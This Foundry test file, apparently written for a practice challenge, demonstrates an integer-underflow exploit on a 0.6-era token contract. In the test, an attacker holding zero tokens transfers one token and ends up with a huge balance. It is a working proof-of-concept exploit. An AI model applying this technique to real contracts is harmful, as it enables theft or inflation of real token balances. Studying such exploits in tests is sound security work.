// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // test ke liye latest compiler, contract 0.6 hai

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TokenTest is Test {
    Token token;
    address attacker;

    function setUp() public {
        token = new Token(100);   // deploy contract with 100 tokens
        attacker = vm.addr(1);    // attacker address
        vm.deal(attacker, 1 ether); // just for simulation, not needed for token
    }

    function testUnderflowExploit() public {
        // Step 1: attacker tries to transfer more than balance
        uint256 attackerBalance = token.balanceOf(attacker); // 0 initially
        uint256 overflowAmount = attackerBalance + 1;        // 1 > 0

        // Step 2: prank as attacker
        vm.prank(attacker);

        // Step 3: call transfer - this will underflow in Token.sol
        token.transfer(vm.addr(2), overflowAmount);

        // Step 4: check attacker balance
        uint256 newBalance = token.balanceOf(attacker);
        console.log("Attacker balance after underflow:", newBalance);

        // Assertion: attacker now has HUGE balance due to underflow
        assertGt(newBalance, 0);
    }
}